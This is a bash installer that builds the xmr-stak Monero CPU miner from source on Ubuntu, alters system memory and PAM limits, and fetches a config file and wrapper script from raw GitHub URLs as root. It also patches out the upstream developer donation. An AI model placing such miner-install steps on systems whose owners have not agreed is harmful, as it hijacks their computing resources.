#!/usr/bin/env bash

## Installs gecko, an xmr stak miner wrapper

_detect_os() {
    echo "Checking your environment..."

    if (( $EUID != 0 )); then
        echo "The gecko installer requires root or sudo to use apt to download compiler tools and install scripts to /usr/local/bin and config to /usr/local/etc."
        exit 1
    fi

    if [ -z "$(uname -v | grep Ubuntu)" ]; then
        echo "Gecko can only be installed on Ubuntu 16.04 and you appear to be using something else. Please fork the project on github and add support for your distro! (https://github.com/michelangelo314/gecko)"
        exit 1
    fi 
}

_check_env() {
    if [ -z "$XMR_STAK_VERSION" ]; then
        export XMR_STAK_VERSION='v1.1.0-1.2.0'
    fi
    if [ -z "$XMR_RELEASE_URL" ]; then
        export XMR_RELEASE_URL="https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_VERSION.tar.gz"
    fi
    export CONFIG_URL="https://raw.githubusercontent.com/michelangelo314/gecko/master/src/config.txt"
    export CONFIG_PATH=/usr/local/etc/xmr-config.txt

    export APP_URL="https://raw.githubusercontent.com/michelangelo314/gecko/master/src/gecko.sh"
    export APP_PATH=/usr/local/bin/gecko

}

_try_setup_hugepages() {
    echo "Trying to setup huge pages..."
    sysctl -w vm.nr_hugepages=128 &> /dev/null
    echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
    sysctl -p  &> /dev/null
    echo "*   soft    memlock 262144" >> /etc/security/limits.conf
    echo "*   hard    memlock 262144" >> /etc/security/limits.conf
    echo "session required pam_limits.so" >> /etc/pam.d/common-session
}

_install_prereqs() {
    echo "Installing prereqs..."

    local PREREQS='curl htop vim apt-transport-https libmicrohttpd10 libssl1.0.0 ca-certificates'
    apt-get update &> /dev/null
    apt-get install -qq -y $PREREQS &> /dev/null
}

_install_xmr_stak() {
    echo "Installing xmr-stak ${XMR_STAK_VERSION}..."

    local BUILD_DEPS='cmake g++ libmicrohttpd-dev libssl-dev make'
    apt-get --no-install-recommends -qq -y install $BUILD_DEPS &> /dev/null
    rm -rf /var/lib/apt/lists/* 

    mkdir -p /usr/local/src/xmr-stak-cpu/build 
    cd /usr/local/src/xmr-stak-cpu/ 
    curl -sL $XMR_RELEASE_URL | tar -xz --strip-components=1 
    sed -i 's/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/' donate-level.h 
    cd build 
    cmake .. &> /dev/null
    make -j$(nproc)  &> /dev/null
    cp bin/xmr-stak-cpu /usr/local/bin/
    curl --output "$CONFIG_PATH" -sL "$CONFIG_URL"

    rm -r /usr/local/src/xmr-stak-cpu 
    apt-get -qq --auto-remove purge $BUILD_DEPS &> /dev/null

    echo "xmr-stack installation completed"     
}

_install_gecko() {
    echo "Installing scripting..."
    curl --output "$APP_PATH" -sL "$APP_URL"
    chmod +x "$APP_PATH"
    echo "Gecko installed to ${APP_PATH}"
}

GECKO_INSTALLER_VERSION="1.0 (pepperoni)"

echo "Gecko installer v${GECKO_INSTALLER_VERSION}"
echo "This will install the xmr stak from source. It is recommended to run this script on a clean system."

_detect_os
_check_env
_try_setup_hugepages
_install_prereqs
_install_xmr_stak
_install_gecko

echo "Gecko installer completed. Certified Turtlefied!"
